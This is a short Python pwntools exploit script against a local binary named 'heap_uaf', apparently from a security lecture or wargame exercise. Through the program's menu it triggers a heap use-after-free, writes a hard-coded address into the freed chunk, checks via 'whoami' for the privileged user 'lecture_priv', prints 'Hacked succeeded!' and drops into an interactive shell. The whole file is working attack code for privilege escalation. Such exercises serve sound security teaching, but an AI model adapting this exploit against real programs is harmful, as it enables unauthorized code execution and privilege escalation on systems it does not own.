from pwn import *

i=0
while(i<1):
    p = process("./heap_uaf")
    ret1 =p.recv(200)
    print ret1
    p.sendline("1")
    ret = p.recv(200)
    p.sendline("aaa")
    print ret
    ret2 = p.recv(200)
    p.sendline("3")
    print ret2
    ret3 = p.recv(200)
    print ret3
    p.sendline("2")
    ret4 = p.recv(200)
    print ret4
    p.sendline("aaa")
    p.sendline("3078036089")
    p.sendline("1")
    print p.recv(200)
    p.sendline("5")
    print (p.recv(200)+"aaaa")
    try:
        #ret = p.recv(400)
        p.sendline("whoami")
        ret5 = p.recv(400)
        if("lecture_priv" in ret5): 
            print(ret5)
            break
    except EOFError:
        continue
log.info("Hacked succeeded!")
p.interactive()

